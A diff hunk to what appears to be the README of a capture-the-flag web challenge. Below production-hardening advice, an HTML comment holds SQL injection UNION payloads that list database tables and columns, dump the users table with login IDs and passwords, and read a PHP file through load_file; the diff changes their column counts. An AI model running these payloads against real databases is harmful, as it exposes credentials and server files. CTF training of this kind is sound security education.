@@ -158,8 +158,7 @@ In Production you should modify at a minimum the following subjects:
 * secure mysql users with proper source IP limitations
 
 <!-- ' UNION SELECT group_concat(table_name), 2 from INFORMATION_SCHEMA.tables; -- 
-' UNION SELECT group_concat(column_name), 2 from INFORMATION_SCHEMA.columns where table_name = 
-'users'; -- 
-' UNION SELECT group_concat(concat(id, ' ', loginid, ' ', password, ' ', auth_bit, ' ', lasttime, ' ', comment), '<SEP>'), 2 from users; -- 
+' UNION SELECT group_concat(column_name), 2, 3, 4, 5 from INFORMATION_SCHEMA.columns where table_name = 'users'; -- 
+' UNION SELECT group_concat(concat(id, ' ', loginid, ' ', password, ' ', auth_bit, ' ', lasttime, ' ', comment), '<SEP>'), 2, 3, 4, 5 from users; -- 
 ' UNION SELECT CURRENT_USER(), 2; -- 
 ' UNION SELECT load_file('/var/www/html/ctf_1/ctf_1_2.php'), 2; --  -->
